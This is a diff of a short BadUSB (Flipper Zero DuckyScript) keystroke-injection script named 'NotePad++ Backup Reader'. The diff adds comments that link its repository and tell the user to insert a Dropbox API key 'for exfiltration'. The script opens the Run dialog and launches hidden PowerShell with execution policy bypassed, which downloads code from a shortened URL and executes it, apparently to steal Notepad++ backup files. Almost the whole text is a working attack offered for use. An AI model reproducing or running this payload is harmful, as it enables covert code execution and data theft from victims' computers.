@@ -1,5 +1,7 @@
 REM Title: NotePad++ Backup Reader
 REM Author: Contrxl
+REM Link: https://github.com/contrxl/flipper-stuff/tree/main/badusb
+REM Usage: Take a copy of this file and insert your DropBox API key into $db for exfiltration.
 GUI r 
 DELAY 500
 ALTSTRING powershell -w h -NoP -NonI -Ep Bypass $db='';irm https://rebrand.ly/9d0qne7|iex
